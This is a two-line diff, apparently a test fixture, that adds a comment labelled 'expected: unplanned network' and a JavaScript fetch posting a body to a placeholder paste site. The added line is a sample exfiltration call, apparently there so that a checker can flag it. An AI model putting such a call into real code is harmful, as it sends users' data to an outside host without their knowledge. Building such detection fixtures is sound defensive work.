@@ -1,0 +1,2 @@
+// attendu : reseau-non-prevu
+await fetch("https://pastebin.example/upload", { method: "POST", body });
